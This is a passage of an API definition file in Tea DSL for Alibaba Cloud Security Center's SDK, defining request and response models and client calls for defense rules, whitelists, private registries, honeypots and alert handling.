/**
 *
 */
import BaseClientBuilder;
import TeaAsyncHandler;
import TeaRequest;
import AsyncRequestBody;
import RequestBody;
import AsyncResponseHandler;
import ClientConfiguration;
import ClientExecutionParams;
extends BaseClientBuilder;
type @product = string
type @version = string
type @endpointRule = string
type @endpointMap = map[string]string
type @REQUEST = TeaRequest
type @handler = TeaAsyncHandler

init(configuration: ClientConfiguration){
  @handler = new TeaAsyncHandler(configuration);
  @product = 'Sas';
  @version = '2018-12-03';
  @endpointRule = 'regional';
  @endpointMap = {
    cn-hangzhou = 'tds.aliyuncs.com',
    cn-qingdao = 'tds.aliyuncs.com',
    cn-beijing = 'tds.aliyuncs.com',
    cn-zhangjiakou = 'tds.aliyuncs.com',
    cn-huhehaote = 'tds.aliyuncs.com',
    cn-wulanchabu = 'tds.aliyuncs.com',
    cn-shanghai = 'tds.aliyuncs.com',
    cn-nanjing = 'tds.aliyuncs.com',
    cn-fuzhou = 'tds.aliyuncs.com',
    cn-shenzhen = 'tds.aliyuncs.com',
    cn-heyuan = 'tds.aliyuncs.com',
    cn-guangzhou = 'tds.aliyuncs.com',
    cn-chengdu = 'tds.aliyuncs.com',
    cn-hongkong = 'tds.aliyuncs.com',
    ap-southeast-1 = 'tds.ap-southeast-1.aliyuncs.com',
    ap-northeast-1 = 'tds.ap-southeast-1.aliyuncs.com',
    ap-northeast-2 = 'tds.ap-southeast-1.aliyuncs.com',
    ap-southeast-2 = 'tds.ap-southeast-1.aliyuncs.com',
    ap-southeast-3 = 'tds.ap-southeast-1.aliyuncs.com',
    ap-southeast-5 = 'tds.ap-southeast-1.aliyuncs.com',
    ap-southeast-6 = 'tds.ap-southeast-1.aliyuncs.com',
    ap-southeast-7 = 'tds.ap-southeast-1.aliyuncs.com',
    us-east-1 = 'tds.ap-southeast-1.aliyuncs.com',
    us-west-1 = 'tds.ap-southeast-1.aliyuncs.com',
    eu-west-1 = 'tds.ap-southeast-1.aliyuncs.com',
    eu-central-1 = 'tds.ap-southeast-1.aliyuncs.com',
    ap-south-1 = 'tds.ap-southeast-1.aliyuncs.com',
    me-east-1 = 'tds.ap-southeast-1.aliyuncs.com',
    me-central-1 = 'tds.ap-southeast-1.aliyuncs.com',
    cn-hangzhou-finance = 'tds.aliyuncs.com',
    cn-shanghai-finance-1 = 'tds.aliyuncs.com',
    cn-shenzhen-finance-1 = 'tds.aliyuncs.com',
    cn-beijing-finance-1 = 'tds.aliyuncs.com',
  };
}

function close(): void {
  @handler.close();
}

model QueryIncidentTracingSubNodesCountRequest {
  vertexIdAndTypeList?: [[ string ]  ](name='VertexIdAndTypeList'),
}

model AddAssetSelectionCriteriaRequest {
  criteria?: string(name='Criteria', description='The search conditions that are used to query assets. The value of this parameter is in the JSON format and is case-sensitive.

> A search condition can be an instance ID, instance name, virtual private cloud (VPC) ID, region, or public IP address. You can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported search conditions.', example='{"LogicalExp":"AND","Criteria":"[{\\"name\\":\\"osType\\",\\"value\\":\\"linux\\",\\"logicalExp\\":\\"AND\\"},{\\"name\\":\\"alarmStatus\\",\\"value\\":\\"YES\\",\\"logicalExp\\":\\"AND\\"}]"}', position='Query'),
  criteriaOperation?: string(name='CriteriaOperation', description='The type of the operation on search conditions. Valid values:

*   **add**: adds assets.
*   **del**: deletes assets.', example='add', position='Query'),
  selectionKey: string(name='SelectionKey', description='The unique ID of the asset.', example='5196d280-5bfa-496a-ba70-8a3935e3****', position='Query'),
  targetOperationList?: [ 
    {
      operation?: string(name='Operation', description='The type of the operation. Valid values:

*   **add**
*   **del**', example='del'),
      target?: string(name='Target', description='The ID of the asset.', example='1188****'),
    }
  ](name='TargetOperationList', description='The list of assets.', position='Query'),
}

model AddAssetSelectionCriteriaResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model AddAssetSelectionCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddAssetSelectionCriteriaResponseBody(name='body'),
}

async function addAssetSelectionCriteria(request: AddAssetSelectionCriteriaRequest): AddAssetSelectionCriteriaResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddAssetSelectionCriteria', 'POST', '/', 'json', false, 'json', request);
}

model AddCheckInstanceResultWhiteListRequest {
  checkGroupId?: string(name='CheckGroupId', description='The ID of the group to which the check item belongs.', example='cQFq20UzZ49K6gRSJD1301****', position='Query'),
  checkId?: long(name='CheckId', description='The ID of the check item.', example='132', position='Query'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of assets.', position='Query'),
}

model AddCheckInstanceResultWhiteListResponseBody = {
  data?: map[string]any(name='Data', description='The adding result.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='ADE57832-9666-511C-9A80-B87DE2E8****'),
}

model AddCheckInstanceResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddCheckInstanceResultWhiteListResponseBody(name='body'),
}

async function addCheckInstanceResultWhiteList(request: AddCheckInstanceResultWhiteListRequest): AddCheckInstanceResultWhiteListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddCheckInstanceResultWhiteList', 'POST', '/', 'json', false, 'json', request);
}

model AddCheckResultWhiteListRequest {
  checkIds?: [ long ](name='CheckIds', description='The IDs of the check items.', position='Query'),
}

model AddCheckResultWhiteListResponseBody = {
  data?: map[string]any(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C699E4E4-F2F4-58FC-A949-457FFE59****'),
}

model AddCheckResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddCheckResultWhiteListResponseBody(name='body'),
}

async function addCheckResultWhiteList(request: AddCheckResultWhiteListRequest): AddCheckResultWhiteListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddCheckResultWhiteList', 'POST', '/', 'json', false, 'json', request);
}

model AddClientUserDefineRuleRequest {
  actionType: int32(name='ActionType', description='The action of the custom defense rule. Valid values:

*   **0**: allow
*   **1**: block', example='1', position='Query'),
  cmdline?: string(name='Cmdline', description='The command line.', example='/usr/sbin/s****', position='Query'),
  filePath?: string(name='FilePath', description='The file path.', example='/etc/pam****', position='Query'),
  ip?: string(name='IP', description='The IP address.', example='10.240.XX.XX', position='Query'),
  md5List?: string(name='Md5List', description='The hash values of processes.', example='0c9045b5bec90f9825f1f3f64dd4****', position='Query'),
  name: string(name='Name', description='The name of the custom defense rule.', example='Rule 1', position='Query'),
  newFilePath?: string(name='NewFilePath', description='The new file path after the file is renamed.', example='/etc/pam****', position='Query'),
  parentCmdline?: string(name='ParentCmdline', description='The parent command line.', example='/usr/sbin/s****', position='Query'),
  parentProcPath?: string(name='ParentProcPath', description='The path to the parent process.', example='c:/windows/system32/i****', position='Query'),
  platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux
*   **all**: all types', example='linux', position='Query'),
  port?: int32(name='Port', description='The port number. This parameter is deprecated.', example='22', position='Query'),
  portStr?: string(name='PortStr', description='The port number. Valid values: **1 to 65535**.', example='80', position='Query'),
  procPath?: string(name='ProcPath', description='The path to the process.', example='c:/windows/system32/i****', position='Query'),
  registryContent?: string(name='RegistryContent', description='The registry value.', example='*SECOH-QAD.exe*', position='Query'),
  registryKey?: string(name='RegistryKey', description='The registry key.', example='HKEY_DYN_****', position='Query'),
  type: int32(name='Type', description='The type of the custom defense rule. Valid values:

*   **1**: Process hash
*   **2**: Command line
*   **3**: Process Network
*   **4**: File Read and Write
*   **5**: Operation on Registry
*   **6**: Dynamic-link Library Loading
*   **7**: File Renaming', example='1', position='Query'),
}

model AddClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='379a9b8f-107b-4630-9e95-2299a1ea****'),
  userDefineRuleAddResult?: {
    id?: long(name='Id', description='The ID of the rule.', example='1'),
    platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux
*   **all**: all types', example='linux'),
    switchId?: string(name='SwitchId', description='The switch ID of the custom defense rule.', example='USER-DEFINE-RULE-SWITCH-TYPE_200****'),
  }(name='UserDefineRuleAddResult', description='The identifier of the custom defense rule.'),
}

model AddClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddClientUserDefineRuleResponseBody(name='body'),
}

async function addClientUserDefineRule(request: AddClientUserDefineRuleRequest): AddClientUserDefineRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddClientUserDefineRule', 'POST', '/', 'json', false, 'json', request);
}

model AddContainerDefenseRuleRequest {
  description?: string(name='Description', description='The description of the rule.', example='test-proc-defense', position='Query'),
  ruleAction?: int32(name='RuleAction', description='The action that is performed when the rule is hit. Valid values:

*   **1**: alert
*   **2**: block', example='1', position='Query'),
  ruleId?: long(name='RuleId', description='The ID of the rule. You do not need to manually specify the ID.', example='500018', position='Query'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='auto-test-rule-lt9umq', position='Query'),
  ruleSwitch?: int32(name='RuleSwitch', description='The switch of the rule. Valid values:

*   **0**: off
*   **1**: on', example='1', position='Query'),
  ruleType?: int32(name='RuleType', example='2', position='Query'),
  scope?: [ 
    {
      allNamespace?: int32(name='AllNamespace', description='Specifies whether to include all namespaces. Valid values:

*   **0**: You can use the Namespaces parameter to specify the namespaces to include.
*   **1**: All namespaces are included.', example='0'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.

>  You can call the [DescribeGroupedContainerInstances](~~182997~~) operation to query the IDs of clusters.', example='8e2***75b'),
      namespaces?: [ string ](name='Namespaces', description='The namespaces to include.'),
    }
  ](name='Scope', description='The scope.', position='Query'),
  whitelist?: {
    hash?: [ string ](name='Hash', description='The hash values of the files that need to be added to the whitelist.

>  This parameter is not supported.'),
    image?: [ string ](name='Image'),
    path?: [ string ](name='Path', description='The paths to the files that need to be added to the whitelist.'),
  }(name='Whitelist', description='The whitelist.', shrink='json', position='Query'),
}

model AddContainerDefenseRuleResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: long(name='Data', description='The ID of the rule that is created.', example='182'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='There was an error with your request.'),
  requestId?: string(name='RequestId', description='The request ID.', example='8C376***AE74FB4'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model AddContainerDefenseRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddContainerDefenseRuleResponseBody(name='body'),
}

async function addContainerDefenseRule(request: AddContainerDefenseRuleRequest): AddContainerDefenseRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddContainerDefenseRule', 'POST', '/', 'json', false, 'json', request);
}

model AddContainerPluginRuleRequest {
  lang?: string(name='Lang', example='zh', position='Query'),
  mode: int32(name='Mode', example='1', position='Query'),
  ruleName: string(name='RuleName', example='tyest111', position='Query'),
  ruleTemplateId: int32(name='RuleTemplateId', example='86863', position='Query'),
  ruleType?: int32(name='RuleType', example='0', position='Query'),
  selectedPolicy: [ string ](name='SelectedPolicy', position='Query'),
  whiteImages?: [ string ](name='WhiteImages', position='Query'),
}

model AddContainerPluginRuleResponseBody = {
  data?: {
    ruleId?: long(name='RuleId', example='219'),
    ruleName?: string(name='RuleName', example='test2'),
    switchId?: string(name='SwitchId', example='USER-CONTAINER-RULE-SWITCH-TYPE_xxxx'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model AddContainerPluginRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddContainerPluginRuleResponseBody(name='body'),
}

async function addContainerPluginRule(request: AddContainerPluginRuleRequest): AddContainerPluginRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddContainerPluginRule', 'POST', '/', 'json', false, 'json', request);
}

model AddImageEventOperationRequest {
  conditions?: string(name='Conditions', example='[{\\"condition\\": \\"MD5\\", \\"type\\": \\"equals\\", \\"value\\": \\"0083a31cc0083a31ccf7c10367a6e783e\\"}]', position='Query'),
  eventKey?: string(name='EventKey', example='PEM', position='Query'),
  eventName?: string(name='EventName', example='PEM', position='Query'),
  eventType?: string(name='EventType', example='sensitiveFile', position='Query'),
  operationCode?: string(name='OperationCode', example='whitelist', position='Query'),
  scenarios?: string(name='Scenarios', example='{\\"type\\": \\"repo\\", \\"value\\": \\"test-aaa/shenzhen-repo-01\\"}', position='Query'),
}

model AddImageEventOperationResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    conditions?: string(name='Conditions', example='[{\\"condition\\": \\"MD5\\", \\"type\\": \\"equals\\", \\"value\\": \\"0083a31cc0083a31ccf7c10367a6e783e\\"}]'),
    eventKey?: string(name='EventKey', example='PEM'),
    eventName?: string(name='EventName', example='PEM'),
    eventType?: string(name='EventType', example='sensitiveFile'),
    id?: long(name='Id', example='443496'),
    operationCode?: string(name='OperationCode', example='whitelist'),
    scenarios?: string(name='Scenarios', example='{\\"type\\": \\"repo\\", \\"value\\": \\"test-aaa/shenzhen-repo-01\\"}'),
  }(name='Data'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='0C8487EF-50C2-54BB-8634-10F8C35D****'),
  success?: boolean(name='Success', example='true'),
}

model AddImageEventOperationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddImageEventOperationResponseBody(name='body'),
}

async function addImageEventOperation(request: AddImageEventOperationRequest): AddImageEventOperationResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddImageEventOperation', 'POST', '/', 'json', false, 'json', request);
}

model AddImageVulWhiteListRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: zh. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  reason?: string(name='Reason', description='The reason why you add the vulnerability to the whitelist.', example='already config in another way', position='Query'),
  source?: string(name='Source', description='The source of the whitelist. Valid values:
- **image**
- **agentless**', example='image', position='Query'),
  target?: string(name='Target', description='The object on which you want to perform the operation. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: the object type. The value is fixed to repo.
*   **target**: the object content. The value is in the Namespace/Image repository format.', example='{\\"type\\":\\"repo\\",\\"target\\":[\\"sas_test/script_0209\\",\\"sas_test/script\\"]}', position='Query'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: system vulnerability
*   **sca**: application vulnerability', example='cve', position='Query'),
  whitelist?: string(name='Whitelist', description='The whitelist. The value of this parameter is in the JSON format and contains the following fields:

*   **Type**: the vulnerability type. Valid values: cve and sca.
*   **Name**: the name of the vulnerability that is specified in Common Vulnerabilities and Exposures (CVE).
*   **AliasName**: the alias of the vulnerability that is specified in CVE.', example='[{\\"Type\\":\\"sca\\",\\"Name\\":\\"imgsca:java:spring-core:AVD-2022-1124599\\",\\"AliasName\\":\\"Spring Framework JDK >= 9 (CVE-2022-22965)\\"}]', position='Query'),
}

model AddImageVulWhiteListResponseBody = {
  code?: string(name='Code', description='The status code returned. A value of **200** indicates that the request was successful. Other values indicate that the request failed. You can identify the cause of the failure based on the value of this parameter.', example='200'),
  data?: boolean(name='Data', description='Indicates whether the image vulnerability is added to the whitelist. Valid values:

*   **true**: The image vulnerability is added to the whitelist.
*   **false**: The image vulnerability is not added to the whitelist.', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model AddImageVulWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddImageVulWhiteListResponseBody(name='body'),
}

async function addImageVulWhiteList(request: AddImageVulWhiteListRequest): AddImageVulWhiteListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddImageVulWhiteList', 'POST', '/', 'json', false, 'json', request);
}

model AddInstallCodeRequest {
  expiredDate?: long(name='ExpiredDate', description='The validity period of the installation command. The value is a 13-digit timestamp.

>  The installation command is valid only within the validity period. An expired installation command cannot be used to install the Security Center agent.', example='1680257463853', position='Query'),
  groupId?: long(name='GroupId', description='The ID of the asset group to which you want to add the asset.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='8076980', position='Query'),
  onlyImage?: boolean(name='OnlyImage', description='Specifies whether to create an image. Default value: **false**. Valid values:

*   **false**: does not create an image.
*   **true**: creates an image.', example='false', position='Query'),
  os?: string(name='Os', description='The operating system of the instance. Default value: **linux**. Valid values:

*   **linux**
*   **windows**
*   **windows-2003**', example='linux', position='Query'),
  proxyCluster?: string(name='ProxyCluster', description='The name of the proxy cluster.', example='proxy_test', position='Query'),
  vendorName?: string(name='VendorName', description='The name of the service provider for the asset. Default value: **ALIYUN**.

>  You can call the [DescribeVendorList](~~DescribeVendorList~~) operation to query the names of service providers.', example='ALIYUN', position='Query'),
}

model AddInstallCodeResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model AddInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddInstallCodeResponseBody(name='body'),
}

async function addInstallCode(request: AddInstallCodeRequest): AddInstallCodeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddInstallCode', 'POST', '/', 'json', false, 'json', request);
}

model AddPrivateRegistryRequest {
  domainName: string(name='DomainName', description='The domain name of the image repository.', example='example.com', position='Query'),
  extraParam?: string(name='ExtraParam', description='The additional parameter of the image repository. This parameter is required when you set the RegistryType parameter to **quay**. Valid values:

*   **namespace**
*   **authToken**', example='[{"namespace":"aa","authToken":"aa"}]', position='Query'),
  netType: long(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: virtual private cloud (VPC)', example='2', position='Query'),
  password: string(name='Password', description='The password that is used to log on to the image repository.', example='******', position='Query'),
  port?: int32(name='Port', position='Query'),
  protocolType: long(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='2', position='Query'),
  registryHostIp: string(name='RegistryHostIp', description='The IP address of the image repository.', example='114.55.**.**', position='Query'),
  registryRegionId: string(name='RegistryRegionId', description='The region ID.

>  You can call the [ListImageRegistryRegion](~~ListImageRegistryRegion~~) operation to query the IDs of supported regions.', example='cn-hangzhou', position='Query'),
  registryType: string(name='RegistryType', description='The type of the private image repository. Valid values:

*   **harbor**
*   **quay**', example='harbor', position='Query'),
  registryVersion: string(name='RegistryVersion', description='The version of the image repository. Valid values:

*   **V1**
*   **V2**', example='V2', position='Query'),
  transPerHour?: int32(name='TransPerHour', description='The number of images that are scanned per hour.', example='10', position='Query'),
  userName: string(name='UserName', description='The username that is used to log on to the image repository.', example='xxxxx', position='Query'),
  vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-wz9hs3e5*******908kd', position='Query'),
}

model AddPrivateRegistryResponseBody = {
  data?: {
    aliUid?: long(name='AliUid', description='The ID of the user.', example='1766185894104***'),
    domainName?: string(name='DomainName', description='The domain name of the image repository.', example='example.com'),
    id?: long(name='Id', description='The ID of the image repository.', example='273698***'),
    netType?: long(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: VPC', example='2'),
    password?: string(name='Password', description='The password.', example='***********'),
    protocolType?: long(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='2'),
    regionId?: string(name='RegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
    registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='114.55.**.**'),
    registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **harbor**
*   **quay**', example='harbor'),
    registryVersion?: string(name='RegistryVersion', description='The version of the image repository. Default value: -. Valid values:

*   **-**: the default version
*   **V1**
*   **V2**', example='V2'),
    token?: string(name='Token', description='The value of the token.', example='3c3c602c-fa1f-4bc0-992f-b4b2cac7****'),
    transPerHour?: int32(name='TransPerHour', description='The number of scan tasks that are performed per hour.', example='10'),
    userName?: string(name='UserName', description='The username.', example='******'),
    vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-2vchkxmf2j9yjt3x2****'),
  }(name='Data', description='The handling result.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model AddPrivateRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddPrivateRegistryResponseBody(name='body'),
}

async function addPrivateRegistry(request: AddPrivateRegistryRequest): AddPrivateRegistryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddPrivateRegistry', 'POST', '/', 'json', false, 'json', request);
}

model AddSasModuleTrialRequest {
  lang?: string(name='Lang', example='zh', position='Query'),
  moduleCode?: string(name='ModuleCode', example='vulFix', position='Query'),
}

model AddSasModuleTrialResponseBody = {
  data?: {
    trialRecordList?: [ 
      {
        authLimit?: long(name='AuthLimit', example='100'),
        gmtEnd?: long(name='GmtEnd', example='1638201599999'),
        gmtStart?: long(name='GmtStart', example='1667232000000'),
        moduleCode?: string(name='ModuleCode', example='vulFix'),
        status?: int32(name='Status', example='1'),
      }
    ](name='TrialRecordList'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
}

model AddSasModuleTrialResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddSasModuleTrialResponseBody(name='body'),
}

async function addSasModuleTrial(request: AddSasModuleTrialRequest): AddSasModuleTrialResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddSasModuleTrial', 'POST', '/', 'json', false, 'json', request);
}

model AddTagWithUuidRequest {
  tagName: string(name='TagName', description='The name of the tag.', example='InternetIp', position='Query'),
  uuidList?: string(name='UuidList', description='The UUIDs of the servers. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='71f5313e-4355-4c59-86d1-557dda7b****,71f5313e-4355-4c59-86d1-557dda7b****', position='Query'),
}

model AddTagWithUuidResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
}

model AddTagWithUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddTagWithUuidResponseBody(name='body'),
}

/**
  * Security Center provides asset importance tags and custom tags. You can call the AddTagWithUuid operation to add only a custom tag to assets.
  *
 */
async function addTagWithUuid(request: AddTagWithUuidRequest): AddTagWithUuidResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddTagWithUuid', 'POST', '/', 'json', false, 'json', request);
}

model AddUninstallClientsByUuidsRequest {
  callMethod?: string(name='CallMethod', description='The method name. Default value: init.', example='init', position='Query'),
  feedback?: string(name='Feedback', description='The feedback.', example='reinstall', position='Query'),
  region?: string(name='Region', description='The region in which the server resides.', example='cn-hangzhou', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='1.2.XXX.XXX', position='Query'),
  uuids: string(name='Uuids', description='The UUID of the server that you want to unbind. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~141932~~) operation to query the UUIDs of servers.', example='inet-183707ae-3bdf-4db0-b771-3e9962bf****,inet-49dceccc-4f01-469b-8411-2416ea12****', position='Query'),
}

model AddUninstallClientsByUuidsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3956048F-9D73-5EDB-834B-4827BB483977'),
}

model AddUninstallClientsByUuidsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddUninstallClientsByUuidsResponseBody(name='body'),
}

async function addUninstallClientsByUuids(request: AddUninstallClientsByUuidsRequest): AddUninstallClientsByUuidsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddUninstallClientsByUuids', 'POST', '/', 'json', false, 'json', request);
}

model AddVpcHoneyPotRequest {
  vpcId: string(name='VpcId', description='The ID of the virtual private cloud (VPC) in which you want to create a honeypot.

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to obtain the VPC ID. The VPC ID is the value of the InstanceId parameter.', example='vpc-p0w5fgkfsl5a6791q****', position='Query'),
}

model AddVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model AddVpcHoneyPotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddVpcHoneyPotResponseBody(name='body'),
}

async function addVpcHoneyPot(request: AddVpcHoneyPotRequest): AddVpcHoneyPotResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AddVpcHoneyPot', 'POST', '/', 'json', false, 'json', request);
}

model AdvanceSecurityEventOperationsRequest {
  eventName?: string(name='EventName', description='The alert name.', example='Execution of malicious script code', position='Query'),
  eventType?: string(name='EventType', description='The alert event type. Valid values:

*   Suspicious process
*   Webshell
*   Unusual logon
*   Exception
*   Sensitive file tampering
*   Malicious process (cloud threat detection)
*   Unusual network connection
*   Abnormal account
*   Application intrusion event
*   Cloud threat detection
*   Precision defense
*   Application whitelist
*   Persistent webshell
*   Web application threat detection
*   Malicious script
*   Threat intelligence
*   Malicious network activity
*   Cluster exception
*   Webshell (on-premises threat detection)
*   Vulnerability exploitation
*   Malicious process (on-premises threat detection)
*   Trusted exception
*   Others

For more information about alert types, see [Alerts](~~68388~~).', example='Malicious script', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  ruleId?: int32(name='RuleId', description='The rule ID.', example='123', position='Query'),
}

model AdvanceSecurityEventOperationsResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-XXXXXXXXX'),
  securityEventOperationsResponse?: [ 
    {
      markField?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', description='The alias of the field that is used in the whitelist rule.', example='file path'),
          filedName?: string(name='FiledName', description='The field that is used in the whitelist rule.', example='filePath'),
          markMisType?: string(name='MarkMisType', description='The operation that is used in the whitelist rule. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **regex**: regular expression
*   **strEqual**: equals
*   **strNotEqual**: does not equal', example='contains'),
          markMisValue?: string(name='MarkMisValue', description='The value of the field that is used in the whitelist rule.', example='2022-04-25 10:11:04'),
          supportedMisType?: [ string ](name='SupportedMisType', description='The operation that is used and can be modified in the whitelist rule. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **regex**: regular expression
*   **strEqual**: equals
*   **strNotEqual**: does not equal'),
        }
      ](name='MarkField', description='The object on which the operation is performed. This parameter is required when you set the OperationCode parameter to **advance_mark_mis_info**.'),
      markFieldsSource?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', description='The alias of the field that can be used in the whitelist rule.', example='file path'),
          filedName?: string(name='FiledName', description='The field that can be used in the whitelist rule.', example='filePath'),
          markMisValue?: string(name='MarkMisValue', description='The value of the field that can be used in the whitelist rule.', example='contains'),
          supportedMisType?: [ string ](name='SupportedMisType', description='The operation that is supported in the whitelist rule. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **regex**: regular expression
*   **strEqual**: equals
*   **strNotEqual**: does not equal'),
        }
      ](name='MarkFieldsSource', description='The metadata configuration returned by the advanced whitelist rule.'),
      operationCode?: string(name='OperationCode', description='The operation performed to handle the alert. Valid values:

*   **block_ip**: blocks the alert.
*   **advance_mark_mis_info**: adds the alert to the whitelist.
*   **ignore**: ignores the alert.
*   **manual_handled**: marks the alert as manually handled.
*   **kill_process**: terminates the malicious process.
*   **cleanup**: performs in-depth virus detection and removal.
*   **kill_and_quara**: performs virus detection and removal.
*   **disable_malicious_defense**: turns off malicious defense behavior.
*   **client_problem_check**: performs troubleshooting.
*   **quara**: performs quarantine operations.', example='advance_mark_mis_info'),
      operationParams?: string(name='OperationParams', description='The configuration of the operation performed to handle the alert event.', example='{\\"subOperation\\":\\"killByMd5andPath\\"}'),
      userCanOperate?: boolean(name='UserCanOperate', description='Indicates whether the operation can be performed.

*   **true**: The operation can be performed.
*   **false**: The operation cannot be performed.', example='false'),
    }
  ](name='SecurityEventOperationsResponse', description='The operation performed on the alert event.'),
}

model AdvanceSecurityEventOperationsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AdvanceSecurityEventOperationsResponseBody(name='body'),
}

async function advanceSecurityEventOperations(request: AdvanceSecurityEventOperationsRequest): AdvanceSecurityEventOperationsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'AdvanceSecurityEventOperations', 'POST', '/', 'json', false, 'json', request);
}

model BatchOperateCommonOverallConfigRequest {
